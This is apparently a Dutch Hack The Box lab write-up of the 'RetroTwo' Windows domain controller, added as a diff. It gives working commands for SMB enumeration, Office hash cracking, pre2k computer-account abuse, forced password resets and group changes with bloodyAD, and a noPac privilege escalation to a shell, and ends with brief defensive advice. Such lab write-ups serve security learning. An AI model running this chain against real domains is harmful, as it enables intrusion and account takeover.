@@ -1,0 +1,356 @@
+---
+title: RetroTwo
+date: 2026-05-31
+platform: Hack The Box
+os: Windows
+difficulty: Easy
+lang: "nl"
+permalink: /nl/writeups/retrotwo/
+alt_url: "/writeups/retrotwo/"
+tags:
+  - active-directory
+  - kerberos
+  - post-exploitation
+  - netexec
+  - bloodhound
+  - smb
+summary: RetroTwo is een Hack The Box-machine met een oude Microsoft Windows Server 2008 R2 Datacenter-domeincontroller.
+logo: /assets/img/writeups/retrotwo/box.png
+---
+
+## Overzicht
+
+Dit is een oude machine in een nieuw tijdperk, en dat is wat hem interessant maakt. Het draait om SMB- en Active Directory-enumeratie, en je krijgt geen gebruikersnaam en wachtwoord mee.
+Het pad waarmee ik de box heb geroot is niet het bedoelde pad. De machine is wel verouderd, en er zijn meerdere manieren om hem te exploiteren.
+
+## Verkenning
+
+Eerst probeerde ik nmap te draaien met de volgende parameters om de poorten te enumereren.
+
+```bash
+nmap -sV -sC -oN retrotwo 10.129.8.42  
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-31 19:52 CEST  
+Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn  
+Nmap done: 1 IP address (0 hosts up) scanned in 3.11 seconds
+```
+
+Nmap zegt me dat ik `-Pn` moet gebruiken, omdat de Windows-machine ICMP-verzoeken blokkeert.
+
+```bash
+
+nmap -sV -sC -Pn -oN retrotwo 10.129.8.42 
+
+```
+
+Er kwamen een paar gangbare poorten voor een Windows-DC uit.
+Een paar interessante dingen:
+
+```text
+<SNIP>
+| smb-os-discovery:  
+|   OS: Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (Windows Server 2008 R2 Datacenter 6.1)  
+|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1  
+|   Computer name: BLN01  
+|   NetBIOS computer name: BLN01\x00  
+|   Domain name: retro2.vl  
+|   Forest name: retro2.vl  
+|   FQDN: BLN01.retro2.vl  
+|_  System time: 2026-05-31T19:56:38+02:00  
+|_clock-skew: mean: -29m58s, deviation: 59m58s, median: 0s  
+</SNIP>
+```
+
+BLN01.retro2.vl toevoegen aan het hosts-bestand.
+
+```bash
+echo "10.129.8.42 BLN01.retro2.vl" | sudo tee -a /etc/hosts
+```
+
+De poorten 445, 389, 3389 en 88 zijn de interessantste.
+Laten we eens kijken.
+
+## Voet aan de grond
+
+Laten we SMB enumereren met een gastaccount.
+
+```bash
+enum4linux-ng -A -u 'Guest' -p '' 10.129.8.42  
+```
+
+Er is een share die toegankelijk is.
+
+```bash
+<SNIP>
+[*] Testing share ADMIN$  
+[+] Mapping: DENIED, Listing: N/A  
+[*] Testing share C$  
+[+] Mapping: DENIED, Listing: N/A  
+[*] Testing share IPC$  
+[-] Could not check share: STATUS_INVALID_PARAMETER  
+[*] Testing share NETLOGON  
+[+] Mapping: OK, Listing: DENIED  
+[*] Testing share Public  
+[+] Mapping: OK, Listing: OK  
+[*] Testing share SYSVOL  
+[+] Mapping: OK, Listing: DENIED  
+</SNIP>
+```
+
+Na het onderzoeken van de share zag ik een Microsoft Access-bestand, dus dat heb ik gedownload.
+
+```bash
+┌─[henk@parrot]─[~/htb/retired/retrotwo]  
+└──╼ $smbclient -U Guest%'' '//10.129.8.42/Public'  
+Try "help" to get a list of possible commands.  
+smb: \> ls  
+.                                   D        0  Sat Aug 17 16:30:37 2024  
+..                                  D        0  Sat Aug 17 16:30:37 2024  
+DB                                  D        0  Sat Aug 17 14:07:06 2024  
+Temp                                D        0  Sat Aug 17 13:58:05 2024  
+  
+6290943 blocks of size 4096. 821240 blocks available  
+smb: \> cd DB  
+smb: \DB\> ls  
+.                                   D        0  Sat Aug 17 14:07:06 2024  
+..                                  D        0  Sat Aug 17 14:07:06 2024  
+staff.accdb                         A   876544  Sat Aug 17 16:30:19 2024  
+  
+6290943 blocks of size 4096. 821240 blocks available  
+smb: \DB\> get staff.accdb  
+getting file \DB\staff.accdb of size 876544 as staff.accdb (8475,2 KiloBytes/sec) (average 8475,2 KiloBytes/sec)
+
+
+
+```
+
+Toen ik `mdb-tables` erop losliet, gaf het een fout.
+Het internet vertelde me dat het bestand corrupt of versleuteld is.
+
+```bash
+└──╼ $mdb-tables staff.accdb  
+mdb_read_table: Page 2 [size=4096] is not a valid table definition page (First byte = 0xF3, expected 0x02)  
+Unable to read table MSysObjects  
+File does not appear to be an Access database
+```
+
+Dus laten we john erop loslaten.
+
+```bash
+└──╼ $office2john staff.accdb  
+staff.accdb:$office$*2013*100000*256*16*5736cfcbb054e749a8f303570c5c1970*1ec683<REDACTED>
+```
+
+```
+john ./hash.txt  -wordlist=/usr/share/wordlists/rockyou.txt
+
+```
+
+Nu hebben we het wachtwoord, en hier komt het deel dat ik het minst leuk vond: ik moest Windows opstarten om het bestand te openen.
+
+Dus ik startte mijn dual-boot laptop op in Windows en opende het bestand.
+
+![Wachtwoordprompt](/assets/img/writeups/retrotwo/pass_access.png)
+
+Toen ik het opende, zag ik een ingebouwde VBA-module.
+
+![VBA-module in de Access-database](/assets/img/writeups/retrotwo/module.png)
+
+De module laat een paar interessante credentials zien. Laten we kijken wat we ermee kunnen.
+
+```vb
+Option Compare Database
+
+Sub ImportStaffUsersFromLDAP()
+    Dim objConnection As Object
+    Dim objCommand As Object
+    Dim objRecordset As Object
+    Dim strLDAP As String
+    Dim strUser As String
+    Dim strPassword As String
+    Dim strSQL As String
+    Dim db As Database
+    Dim rst As Recordset
+    
+    strLDAP = "LDAP://OU=staff,DC=retro2,DC=vl"
+    strUser = "retro2\ldapreader"
+    strPassword = "<REDACTED>"
+    
+    Set objConnection = CreateObject("ADODB.Connection")
+    
+    objConnection.Provider = "ADsDSOObject"
+    objConnection.Properties("User ID") = strUser
+    objConnection.Properties("Password") = strPassword
+    objConnection.Properties("Encrypt Password") = True
+    objConnection.Open "Active Directory Provider"
+    
+    Set objCommand = CreateObject("ADODB.Command")
+    objCommand.ActiveConnection = objConnection
+    
+    objCommand.CommandText = "<" & strLDAP & ">;(objectCategory=person);cn,distinguishedName,givenName,sn,sAMAccountName,userPrincipalName,description;subtree"
+    
+    Set objRecordset = objCommand.Execute
+    
+    Set db = CurrentDb
+    Set rst = db.OpenRecordset("StaffMembers", dbOpenDynaset)
+    
+    Do Until objRecordset.EOF
+        rst.AddNew
+        rst!CN = objRecordset.Fields("cn").Value
+        rst!DistinguishedName = objRecordset.Fields("distinguishedName").Value
+        rst!GivenName = Nz(objRecordset.Fields("givenName").Value, "")
+        rst!SN = Nz(objRecordset.Fields("sn").Value, "")
+        rst!sAMAccountName = objRecordset.Fields("sAMAccountName").Value
+        rst!UserPrincipalName = Nz(objRecordset.Fields("userPrincipalName").Value, "")
+        rst!Description = Nz(objRecordset.Fields("description").Value, "")
+        rst.Update
+        
+        objRecordset.MoveNext
+    Loop
+    
+    rst.Close
+    objRecordset.Close
+    objConnection.Close
+    Set rst = Nothing
+    Set objRecordset = Nothing
+    Set objCommand = Nothing
+    Set objConnection = Nothing
+    
+    MsgBox "Staff users imported successfully!", vbInformation
+End Sub
+
+```
+
+Laten we wat data ophalen voor het BloodHound-onderzoek.
+
+```bash
+└──╼ $nxc ldap 10.129.8.42 -u ldapreader -p <REDACTED> -d retro2.vl --dns-server 10.129.8.42 --dns-tcp --bloodhound -c All  
+LDAP        10.129.8.42     389    BLN01            [*] Windows 7 / Server 2008 R2 Build 7601 (name:BLN01) (domain:retro2.vl) (signing:None) (channel binding:No TLS cert)  
+LDAP        10.129.8.42     389    BLN01            [+] retro2.vl\ldapreader:<REDACTED>  
+LDAP        10.129.8.42     389    BLN01            Resolved collection methods: acl, adcs, container, dcom, group, localadmin, loggedon, objectprops, psremote, rdp, session, trusts  
+LDAP        10.129.8.42     389    BLN01            Excluded collection methods:  
+LDAP        10.129.8.42     389    BLN01            Bloodhound data collection completed in 0M 2S  
+LDAP        10.129.8.42     389    BLN01            Collecting ADCS data (CertiHound)...  
+LDAP        10.129.8.42     389    BLN01            Found 0 certificate templates  
+LDAP        10.129.8.42     389    BLN01            Found 0 Enterprise CAs  
+LDAP        10.129.8.42     389    BLN01            Compressing output into /home/user/.nxc/logs/BLN01_10.129.8.42_2026-05-31_213507_bloodhound.zip
+
+
+```
+
+Laten we een krb5.conf maken voor Kerberos-gebruik.
+
+```bash
+nxc smb BLN01.retro2.vl -u ldapreader -p <REDACTED> --generate-krb5-file krb5.conf
+export KRB5_CONFIG="$(pwd)/krb5.conf"
+
+```
+
+Omdat dit een retro-machine is, laten we kijken of er machine-accounts op het systeem staan die we kunnen gebruiken.
+
+Eerst de tijd gelijkzetten.
+
+```bash
+sudo ntpdate -s 10.129.8.42
+```
+
+```bash
+└──╼ $nxc ldap BLN01.retro2.vl -u ldapreader -p <REDACTED> -d retro2.vl --kdcHost 10.129.8.42 -M pre2k  
+LDAP        10.129.8.42     389    BLN01            [*] Windows 7 / Server 2008 R2 Build 7601 (name:BLN01) (domain:retro2.vl) (signing:None) (channel binding:No TLS cert)  
+LDAP        10.129.8.42     389    BLN01            [+] retro2.vl\ldapreader:<REDACTED>  
+PRE2K       10.129.8.42     389    BLN01            Pre-created computer account: FS01$  
+PRE2K       10.129.8.42     389    BLN01            Pre-created computer account: FS02$  
+PRE2K       10.129.8.42     389    BLN01            [+] Found 2 pre-created computer accounts. Saved to /home/henk/.nxc/modules/pre2k/retro2.vl/precreated_computers.txt  
+PRE2K       10.129.8.42     389    BLN01            [+] Successfully obtained TGT for fs01@retro2.vl  
+PRE2K       10.129.8.42     389    BLN01            [+] Successfully obtained TGT for fs02@retro2.vl  
+PRE2K       10.129.8.42     389    BLN01            [+] Successfully obtained TGT for 2 (pre-created) computer accounts. Saved to /home/henk/.nxc/modules/pre2k/ccache
+
+```
+
+Laten we de BloodHound-data bekijken om te zien of er iets interessants in zit.
+
+![BloodHound-pad](/assets/img/writeups/retrotwo/path.png)
+
+En daar is het pad. We kunnen het wachtwoord van het computeraccount ADMWS01$ wijzigen; dat account heeft de rechten om een lid aan de services-groep toe te voegen, en die groep heeft weer rechten voor remote desktop.
+Laten we dat pad exploiteren.
+
+1. het wachtwoord van ADMWS01$ wijzigen
+2. ldapreader toevoegen aan de services-groep
+3. via RDP inloggen en de user.txt pakken
+
+Eerst gebruiken we de ticket van FS01$ om het wachtwoord van ADMWS01$ te wijzigen.
+
+```bash
+export KRB5CCNAME=/home/user/.nxc/modules/pre2k/ccache/fs01.ccache
+```
+
+```bash
+└──╼ $bloodyAD --host BLN01.retro2.vl -d retro2.vl -k -u FS01$ --dc-ip 10.129.8.42 --dns 10.129.8.42 set password 'ADMWS01$' 'Password123!'  
+[+] Password changed successfully!
+```
+
+Nu voegen we de gebruiker ldapreader toe aan de services-groep.
+
+```bash
+bloodyAD --host BLN01.retro2.vl -d retro2.vl -u 'ADMWS01$' -p 'Password123!' --dc-ip 10.129.8.42 --dns 10.129.8.42 add groupMember services 'ldapreader'  
+[+] ldapreader added to services
+
+```
+
+Daarna logde ik in als ldapreader.
+Hij klaagde over het certificaat, dus ik voegde `/cert:ignore /sec:rdp` toe.
+
+```bash
+xfreerdp3 /v:10.129.8.42 /u:ldapreader /p:<REDACTED>  /d:retro2  /drive:linux,/home/users/tools /w:3440 /h:1400 /cert:ignore /sec:rdp
+
+```
+
+![De user-flag](/assets/img/writeups/retrotwo/user.png)
+
+## Privilege escalation
+
+Omdat dit een oud besturingssysteem is, zijn er meerdere escalatiepaden. Met NetExec ontdekte ik dat het een noPac-kwetsbaarheid heeft.
+
+```bash
+└──╼ $nxc smb 10.129.8.42 -u 'ADMWS01$' -p 'Password123!' -d retro2.vl --dns-server 10.129.8.42 --dns-tcp -M nopac
+SMB         10.129.8.42    445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True) (Null Auth:True)
+SMB         10.129.8.42    445    BLN01            [+] retro2.vl\ADMWS01$:Password123!
+NOPAC       10.129.8.42    445    BLN01            TGT with PAC size 1410
+NOPAC       10.129.8.42    445    BLN01            TGT without PAC size 701
+NOPAC       10.129.8.42    445    BLN01
+NOPAC       10.129.8.42    445    BLN01            VULNERABLE
+NOPAC       10.129.8.42    445    BLN01            Next step: https://github.com/Ridter/noPac
+```
+
+```bash
+git clone https://github.com/Ridter/noPac
+Cloning into 'noPac'...
+remote: Enumerating objects: 108, done.
+remote: Counting objects: 100% (44/44), done.
+remote: Compressing objects: 100% (33/33), done.
+remote: Total 108 (delta 22), reused 24 (delta 11), pack-reused 64 (from 1)
+Receiving objects: 100% (108/108), 72.32 KiB | 3.29 MiB/s, done.
+Resolving deltas: 100% (58/58), done.
+
+```
+
+```bash
+python3 noPac.py retro2.vl/ldapreader:'<REDACTED>' -dc-ip 10.129.8.42  -shell --impersonate administrator -use-ldap
+```
+
+![De root-flag](/assets/img/writeups/retrotwo/nopac.png)
+
+## Beslismomenten
+
+Voor mijn eerste gepubliceerde writeup probeerde ik een retired box op te lossen zoals ik dat gewoonlijk doe.
+Ik probeerde het versleutelde Access-bestand met Linux te openen, maar dat lukte niet.
+Dat komt doordat ik verwachtte dat het Access-bestand een tabel met rijen zou bevatten, geen VBA-module.
+Dus gebruikte ik Windows, wat als valsspelen voelde. Voor de rest wijst het BloodHound-pad zichzelf.
+En het bedoelde root-pad was een stuk vergezochter dan een NetExec-scan.
+
+## Verdedigend perspectief
+
+Vanuit verdedigend perspectief: draai geen besturingssysteem dat zo oud is, en gebruik geen korte, makkelijk te kraken wachtwoorden. En verstop credentials niet achter een wachtwoord op een bestand: dat is geen versleuteling, dat is een slot op een open deur.
+
+## Lessen
+
+Ik heb een paar nieuwe manieren geleerd om een Windows-machine te privescen. Ik heb het systeem niet op de bedoelde manier geroot, maar het leerde me wel een nieuwe techniek en een nieuwe tool.
